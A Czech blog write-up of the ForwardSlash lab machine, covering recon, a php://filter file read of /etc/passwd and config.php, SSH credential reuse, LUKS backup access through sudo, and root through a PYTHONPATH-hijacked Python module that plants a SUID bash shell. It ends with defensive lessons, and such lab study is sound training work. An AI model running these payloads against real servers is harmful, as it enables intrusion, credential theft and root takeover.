---
layout: post
author: Tomáš Matějíček
title: "ForwardSlash"
date: 2020-11-29
tags: linux lfi rce ssh sudo php
---
## Úvod a kontext

ForwardSlash je dobrý příklad řetězce, kde první foothold vznikne z webové chyby, ale root už je čistě lokální Python a `sudo` problém. Začíná to vhosty `forwardslash.htb` a `backup.forwardslash.htb`, pokračuje file read přes `php://filter` a pak se útok přesune z webu na SSH.

Na tom stroji je důležité správně číst návaznost kroků. LFI na `backup.forwardslash.htb` dává heslo pro účet `pain`; ten díky `sudo` pravidlům otevře šifrovanou zálohu a z ní získá klíč k účtu `chiv`. Teprve `chiv` má pak přístup k rootu přes špatně navržený Python backup skript a `PYTHONPATH` hijacking.

## Počáteční průzkum

### Vhosty a vývojová část webu

První `nmap` ukáže jen SSH a Apache, takže stejně jako u jiných vhostových strojů dává smysl hledat další hostname. Hlavní web navíc obsahuje `note.txt` a druhý vhost `backup.forwardslash.htb`, na kterém leží vývojová cesta `/dev/`.
```bash
ports=$(nmap -p- --min-rate=1000 -T4 $IP | grep ^[0-9] | cut -d "/" -f 1 | tr "\n" "," | sed s/,$//);echo $ports;nmap -p $ports -A -sC -sV -v $IP
dirb http://forwardslash.htb -X ,.php,.txt,.log,.xml
wfuzz -H "Host: FUZZ.forwardslash.htb" -w /usr/share/wordlists/wfuzz/general/common.txt --hh 0 http://$IP
./dirsearch/dirsearch.py -u http://backup.forwardslash.htb -e php -x 403 -r
```
```text
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
80/tcp open  http    Apache httpd 2.4.29

=> http://forwardslash.htb/note.txt
=> backup.forwardslash.htb
=> http://backup.forwardslash.htb/dev/
```

### File read přes `api.php`

V `/dev/` se ukáže endpoint `api.php`, který server-side načítá adresu poslanou v parametru `url`. Jakmile přijme i `php://filter`, nejde už o obyčejný helper pro upload, ale o čitelný lokální file include.
```bash
curl -F "url=php://filter/convert.base64-encode/resource=/etc/passwd" -H "Cookie: PHPSESSID=tt2u04m6a1pb9vavplb2e88vvt;" http://backup.forwardslash.htb/api.php | base64 -d -
curl -F "url=php://filter/convert.base64-encode/resource=config.php" -H "Cookie: PHPSESSID=tt2u04m6a1pb9vavplb2e88vvt;" http://backup.forwardslash.htb/api.php | base64 -d -
```

## Analýza zjištění

### Přihlašovací údaje pro `pain`

`config.php` je na tomhle stroji zlomový soubor. Obsahuje přístupové údaje aplikace, konkrétně uživatelská jména `pain` a `backupadmin` a heslo `5n0wCr47h3R`. Jakmile se tyto údaje ukážou v konfiguračním souboru PHP aplikace, je rozumné je vyzkoušet i na SSH, protože právě to dá stabilnější přístup než další práce přes LFI.

### Co dovolí `sudo` účtu `pain`

Účet `pain` nemá root hned, ale `sudo -l` ukáže nezvykle široká oprávnění kolem šifrované zálohy: `cryptsetup luksOpen`, mount ` /dev/mapper/backup` a následný unmount. To je důležité, protože zálohovaný svazek často obsahuje citlivější data než živý webroot.
```text
ssh pain@forwardslash.htb

sudo -l
    (root) NOPASSWD: /sbin/cryptsetup luksOpen *
    (root) NOPASSWD: /bin/mount /dev/mapper/backup ./mnt/
    (root) NOPASSWD: /bin/umount ./mnt/
```

Stejné heslo `5n0wCr47h3R` funguje i jako LUKS passphrase. Po připojení svazku se v záloze objeví soukromý klíč `id_rsa` a poznámka s passphrase `Fj5AkyRhPOwMrog`, což převádí foothold z `pain` na vyšší účet `chiv`.

## Získání přístupu

### Od `pain` k `chiv`

Tady je důležité neulpět na prvním shellu. `pain` je jen mezistanice k citlivé záloze. Přes whitelisting v `sudo` lze backup svazek korektně otevřít, připojit a z něj vytáhnout SSH klíč.
```text
ssh pain@forwardslash.htb

sudo /sbin/cryptsetup luksOpen /var/backups/recovery.luks backup
sudo /bin/mount /dev/mapper/backup ./mnt/

cat mnt/id_rsa
cat mnt/note.txt
=> Fj5AkyRhPOwMrog

ssh -i id_rsa chiv@forwardslash.htb
cat user.txt
__CENSORED__
```

## Eskalace oprávnění

### `backup`, Python importy a `PYTHONPATH`

Účet `chiv` má přes `sudo` povolený binární wrapper `/usr/bin/backup`. Ten je napsaný v Pythonu a při běhu importuje standardní moduly bez ochrany proti přepsání importní cesty. To je přesně situace, kdy dává smysl uvažovat o Python library hijackingu místo hledání SUID nebo kernel exploitu.

Stačí do vlastního adresáře připravit škodlivý modul se stejným jménem jako importovaná knihovna, nasměrovat `PYTHONPATH` na tento adresář a pak spustit `backup` přes `sudo`. Root proces pak načte útočníkův modul a vykoná jeho kód ještě před vlastním během skriptu.
```bash
cat > /dev/shm/shutil.py <<'EOF'
import os
os.system("cp /bin/bash /tmp/rootshell && chmod 4777 /tmp/rootshell")
EOF

sudo PYTHONPATH=/dev/shm /usr/bin/backup
/tmp/rootshell -p
cat /root/root.txt
```

## Shrnutí klíčových poznatků

- Webová část byla důležitá hlavně proto, že odhalila konfigurační tajemství. Skutečný přístup ale začal až jejich reuse na SSH.
- Účet `pain` nebyl cíl, ale pivot. Jeho `sudo` oprávnění k šifrované záloze vedla ke klíči a passphrase pro účet `chiv`.
- Root část je čistě o Pythonu: privilegovaný skript načetl knihovnu z útočníkem určeného `PYTHONPATH`, takže z běžného wrapperu vznikla přímá cesta k rootu.

## Co si odnést do praxe

- Endpointy typu `api.php`, které server-side načítají URL nebo soubory, je nutné navrhovat jako vysoce rizikové. Jakmile přijmou `php://filter`, `file://` nebo podobné wrappery, z pomocné funkce je okamžitě file read nad celým serverem.
- Zálohy a šifrované kontejnery je potřeba chránit stejně přísně jako produkční data. ForwardSlash ukazuje, že i když je hlavní systém zamčený, špatně delegovaný přístup k backupu může odkrýt klíče a hesla pro vyšší účty.
- Python skripty spouštěné přes `sudo` musí mít pevně řízené importy a prostředí. Pokud lze ovlivnit `PYTHONPATH`, je libovolný import potenciální root exploit, i když samotný skript nedělá nic očividně nebezpečného.
